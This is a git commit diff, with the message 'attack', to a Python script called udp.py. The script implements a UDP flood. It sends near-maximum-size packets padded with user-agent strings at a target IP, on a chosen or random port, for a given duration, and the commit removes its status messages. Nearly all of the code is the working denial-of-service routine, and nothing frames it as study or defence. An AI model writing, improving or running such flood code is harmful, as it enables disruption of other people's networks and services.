3e5c6f4ba8b5fb61aad5712a702b348cda4375a9
ievrmn <kpbhch@gmail.com>
2024-12-28 09:15:30 +0300

    Update udp.py
    attack

--- udp.py
+++ udp.py
@@ -3,39 +3,27 @@ import random
 import sys
 import time
 
-
 def read_user_agents(file):
     with open(file, 'r') as f:
         return [line.strip() for line in f.readlines()]
 
-
 def UDPFlood(ip, port, dur):
-    
     user_agents = read_user_agents('ua.txt')
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
     randport = (True, False)[port == 0]
     clock = (lambda: 0, time.time)[dur > 0]
     duration = (1, (clock() + dur))[dur > 0]
 
-    print(f'ZxC-UDP: {ip}:{port} for {dur} seconds')
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-
     while True:
-        
         user_agent = random.choice(user_agents)
-
-         
-        bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  # جعل الحزمة بحجم ثابت
+        bytes = user_agent.encode('utf-8') + b" " * (65500 - len(user_agent))  
         port = (random.randint(1, 65535), port)[randport]
-
+        
         if time.time() < duration:
             sock.sendto(bytes, (ip, port))
         else:
             break
-
-    print('DONE')
-
 
 if __name__ == "__main__":
     if len(sys.argv) != 4:
